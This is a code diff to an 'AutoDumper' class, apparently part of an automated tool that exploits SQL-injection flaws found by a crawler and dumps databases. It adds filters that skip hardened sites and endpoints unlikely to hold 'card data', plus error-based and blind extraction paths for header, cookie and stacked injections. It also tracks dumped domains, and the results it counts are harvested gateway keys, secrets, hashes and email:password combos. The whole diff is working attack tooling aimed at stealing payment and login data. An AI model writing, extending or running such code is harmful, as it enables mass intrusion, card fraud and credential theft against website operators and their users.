@@ -326,6 +326,10 @@ class AutoDumper:
         
         self.dump_dir = Path(getattr(config, 'dump_dir', 'dumps'))
         self.dump_dir.mkdir(parents=True, exist_ok=True)
+        
+        # Track dumped domains to avoid re-dumping within the same session
+        self._dumped_domains: set = set()
+        self._failed_domains: set = set()  # Domains that returned 0 data
 
     # ──────────────────────────────────────────────────────────
     # Main orchestrator
@@ -358,6 +362,52 @@ class AutoDumper:
         
         logger.info(f"[AutoDump] Starting for {url[:60]} "
                     f"(type={sqli_result.injection_type}, dbms={sqli_result.dbms})")
+        
+        # ── Step 0: Pre-dump false-positive filter ──
+        # Skip URLs that are almost certainly undumpable to avoid wasting time
+        _skip_domains = {
+            "microsoft.com", "google.com", "youtube.com", "facebook.com",
+            "twitter.com", "linkedin.com", "github.com", "stackoverflow.com",
+            "amazon.com", "apple.com", "cloudflare.com", "akamai.com",
+            "msn.com", "bing.com", "yahoo.com", "reddit.com",
+            "bitcointalk.org", "bitcoin.org", "dash.org",  # crypto sites the crawler keeps hitting
+        }
+        _skip_extensions = (".js", ".css", ".jpg", ".jpeg", ".png", ".gif",
+                           ".svg", ".ico", ".woff", ".woff2", ".ttf", ".pdf")
+        _skip_paths = ("/wp-login", "/wp-admin/admin-ajax", "/xmlrpc.php",
+                       "/administrator/", "/phpmyadmin/")
+        
+        try:
+            from urllib.parse import urlparse as _urlparse
+            _parsed_url = _urlparse(url)
+            _domain = _parsed_url.netloc.lower().split(":")[0]
+            _path = _parsed_url.path.lower()
+            
+            # Skip major domains that are never injectable in practice
+            for _skip in _skip_domains:
+                if _domain == _skip or _domain.endswith(f".{_skip}"):
+                    logger.info(f"[AutoDump] Skipping {_domain} — hardened domain")
+                    return parsed
+            
+            # Skip static file extensions
+            if any(_path.endswith(ext) for ext in _skip_extensions):
+                logger.info(f"[AutoDump] Skipping {url[:60]} — static file extension")
+                return parsed
+            
+            # Skip known admin/CMS endpoints that won't have card data
+            if any(sp in _path for sp in _skip_paths):
+                logger.info(f"[AutoDump] Skipping {url[:60]} — admin/CMS endpoint")
+                return parsed
+            
+            # Deduplicate: skip domains already dumped or known to fail
+            if _domain in self._dumped_domains:
+                logger.info(f"[AutoDump] Skipping {_domain} — already dumped this session")
+                return parsed
+            if _domain in self._failed_domains:
+                logger.info(f"[AutoDump] Skipping {_domain} — previously failed")
+                return parsed
+        except Exception:
+            pass
         
         # ── Step 1: Execute dump via best available method ──
         dump_data = None
@@ -418,6 +468,48 @@ class AutoDumper:
                 except Exception as e:
                     logger.debug(f"[AutoDump] Error-blind fallback failed: {e}")
         
+        elif sqli_result.injection_type in ("header", "cookie", "stacked"):
+            # Header/cookie/stacked injections: try error-based extraction first
+            # (these are often MSSQL xp_cmdshell or stacked queries)
+            # Re-classify as error-type and try targeted_dump
+            logger.info(f"[AutoDump] {sqli_result.injection_type} injection — "
+                       f"attempting error-based extraction")
+            try:
+                # Force error-based extraction path
+                dump_data = await self.dumper.targeted_dump(sqli_result, session)
+                parsed.source = f"{sqli_result.injection_type}_error"
+                if dump_data and dump_data.total_rows == 0:
+                    dump_data = None
+            except Exception as e:
+                logger.debug(f"[AutoDump] {sqli_result.injection_type} error-based failed: {e}")
+            
+            # Blind fallback
+            if not dump_data and getattr(self.config, 'dumper_blind_enabled', True):
+                try:
+                    dump_data = await self.dumper.blind_targeted_dump(sqli_result, session)
+                    parsed.source = f"{sqli_result.injection_type}_blind"
+                except Exception as e:
+                    logger.debug(f"[AutoDump] {sqli_result.injection_type} blind fallback failed: {e}")
+        
+        else:
+            # Unknown injection type — try error-based then blind as best effort
+            logger.info(f"[AutoDump] Unknown type '{sqli_result.injection_type}' — "
+                       f"trying error-based + blind")
+            try:
+                dump_data = await self.dumper.targeted_dump(sqli_result, session)
+                parsed.source = "generic_error"
+                if dump_data and dump_data.total_rows == 0:
+                    dump_data = None
+            except Exception as e:
+                logger.debug(f"[AutoDump] Generic error-based failed: {e}")
+            
+            if not dump_data and getattr(self.config, 'dumper_blind_enabled', True):
+                try:
+                    dump_data = await self.dumper.blind_targeted_dump(sqli_result, session)
+                    parsed.source = "generic_blind"
+                except Exception as e:
+                    logger.debug(f"[AutoDump] Generic blind fallback failed: {e}")
+        
         # ── Step 2: OOB fallback if no data yet ──
         has_data = dump_data and dump_data.total_rows > 0
         if not has_data and self.oob_injector:
@@ -433,6 +525,13 @@ class AutoDumper:
         
         if not dump_data or dump_data.total_rows == 0:
             logger.info(f"[AutoDump] No data extracted from {url[:60]}")
+            # Track failed domain to avoid re-attempting
+            try:
+                from urllib.parse import urlparse as _urlparse2
+                _fd = _urlparse2(url).netloc.lower().split(":")[0]
+                self._failed_domains.add(_fd)
+            except Exception:
+                pass
             return parsed
         
         # ── Step 3: Deep-parse all dumped rows ──
@@ -593,6 +692,14 @@ class AutoDumper:
                     f"{len(parsed.gateway_keys)} keys, {len(parsed.secrets)} secrets, "
                     f"{len(parsed.hashes)} hashes, {len(parsed.emails)} emails, "
                     f"{len(parsed.combos_email_pass)} combos")
+        
+        # Track successful domain
+        try:
+            from urllib.parse import urlparse as _urlparse3
+            _sd = _urlparse3(url).netloc.lower().split(":")[0]
+            self._dumped_domains.add(_sd)
+        except Exception:
+            pass
         
         return parsed
 
